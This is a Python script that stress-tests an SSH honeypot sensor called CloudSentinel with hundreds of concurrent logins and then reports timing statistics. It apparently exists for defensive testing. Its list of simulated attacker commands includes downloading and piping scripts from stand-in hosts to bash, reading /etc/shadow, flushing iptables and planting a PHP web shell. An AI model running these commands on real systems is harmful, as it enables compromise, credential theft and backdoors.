#!/usr/bin/env python3
"""
CloudSentinel Stress Test - Concurrent SSH Connection Simulator.
Validates that the sensor handles 500+ concurrent connections with
MTTB < 0.1s (Phase 1: DigitalOcean).

Usage:
    python stress_test.py --host 127.0.0.1 --port 2222 --connections 500
"""

from __future__ import annotations

import argparse
import asyncio
import json
import logging
import os
import time
from pathlib import Path
from typing import ClassVar

logger = logging.getLogger("stress_test")


class StressTest:
    """Multi-connection SSH stress tester."""

    # Malicious commands to simulate (for SOAR testing)
    MALICIOUS_CMDS: ClassVar[list[str]] = [
        "wget http://evil.example.com/bot.sh -O /tmp/bot.sh",
        "curl -s http://malware.c2/bins/x86 | bash",
        "chmod 777 /tmp/bot.sh && bash -c /tmp/bot.sh",
        "cat /etc/shadow",
        "uname -a && cat /etc/os-release",
        "whoami && id && w",
        "netstat -antp | grep LISTEN",
        "iptables -F INPUT",
        "ssh root@10.0.0.5 -p 2222",
        "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php",
    ]

    def __init__(
        self, host: str, port: int, count: int, delay: float = 0.01
    ) -> None:
        self.host = host
        self.port = port
        self.count = count
        self.delay = delay
        self.connected: int = 0
        self.failed: int = 0
        self.timings: list[float] = []
        self.start_time: float = 0.0

    async def run(self) -> dict:
        """Run the stress test."""
        import asyncssh

        self.start_time = time.perf_counter()
        logger.info("Starting stress test: %d connections to %s:%d", self.count, self.host, self.port)

        async def connect_one(i: int) -> None:
            """Establish one SSH connection and run commands."""
            t0 = time.perf_counter()
            try:
                async with asyncssh.connect(
                    self.host, self.port,
                    username=f"attacker_{i}",
                    password=f"password_{i}",
                    known_hosts=None,
                    login_timeout=10,
                ) as conn:
                    connect_time = time.perf_counter() - t0
                    self.timings.append(connect_time)
                    self.connected += 1

                    async with conn.create_process() as process:
                        # Send a series of commands
                        for cmd in self.MALICIOUS_CMDS[:3]:
                            process.stdin.write((cmd + "\n").encode())
                            try:
                                await asyncio.wait_for(
                                    process.stdout.read(4096), timeout=5.0
                                )
                            except asyncio.TimeoutError:
                                pass
                        process.stdin.write(b"exit\n")
            except Exception as exc:
                self.failed += 1
                logger.debug("Connection %d failed: %s", i, exc)

        # Launch connections in batches
        batch_size = 50
        for batch_start in range(0, self.count, batch_size):
            batch_end = min(batch_start + batch_size, self.count)
            tasks = [connect_one(i) for i in range(batch_start, batch_end)]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(self.delay)
            if batch_start % 200 == 0:
                logger.info("Progress: %d/%d connected", self.connected, self.count)

        elapsed = time.perf_counter() - self.start_time
        return self._report(elapsed)

    def _report(self, elapsed: float) -> dict:
        """Generate results report."""
        if self.timings:
            timings = sorted(self.timings)
            avg = sum(self.timings) / len(self.timings)
            p50 = timings[len(timings) // 2]
            p95 = timings[min(len(timings) - 1, int(len(timings) * 0.95))]
            p99 = timings[min(len(timings) - 1, int(len(timings) * 0.99))]
        else:
            avg = p50 = p95 = p99 = 0.0
        failure_rate = (self.failed / self.count) if self.count else 0.0

        report = {
            "total_attempted": self.count,
            "successful": self.connected,
            "failed": self.failed,
            "failure_rate": round(failure_rate, 4),
            "elapsed_seconds": round(elapsed, 2),
            "connections_per_second": round(self.connected / elapsed, 1) if elapsed > 0 else 0,
            "avg_connect_time_ms": round(avg * 1000, 2),
            "p50_connect_ms": round(p50 * 1000, 2),
            "p95_connect_ms": round(p95 * 1000, 2),
            "p99_connect_ms": round(p99 * 1000, 2),
            "acceptance_pass": self.connected >= min(500, self.count) and failure_rate <= 0.05,
            "resource_snapshot": self._resource_snapshot(),
        }

        logger.info("=" * 60)
        logger.info("STRESS TEST RESULTS")
        logger.info("=" * 60)
        logger.info("Connections: %d/%d successful (%d failed)", self.connected, self.count, self.failed)
        logger.info("Duration: %.2fs (%.1f conn/s)", elapsed, report["connections_per_second"])
        logger.info("Connect time: avg=%.2fms p50=%.2fms p99=%.2fms", avg * 1000, p50 * 1000, p99 * 1000)
        if self.connected >= 500:
            logger.info("PASS: 500+ concurrent connections achieved")
        else:
            logger.warning("FAIL: only %d/500 connections", self.connected)

        return report

    def _resource_snapshot(self) -> dict:
        snapshot = {"pid": os.getpid()}
        try:
            snapshot["loadavg"] = os.getloadavg()
        except (AttributeError, OSError):
            snapshot["loadavg"] = None
        return snapshot


async def main() -> None:
    parser = argparse.ArgumentParser(description="CloudSentinel Stress Test")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=2222)
    parser.add_argument("--connections", type=int, default=500)
    parser.add_argument("--delay", type=float, default=0.01)
    parser.add_argument("--acceptance", action="store_true")
    parser.add_argument("--output", default="")
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    test = StressTest(args.host, args.port, args.connections, args.delay)
    report = await test.run()
    if args.output:
        output = Path(args.output)
        output.parent.mkdir(parents=True, exist_ok=True)
        output.write_text(json.dumps(report, indent=2, sort_keys=True), encoding="utf-8")
    if args.acceptance and not report["acceptance_pass"]:
        raise SystemExit(1)


if __name__ == "__main__":
    asyncio.run(main())
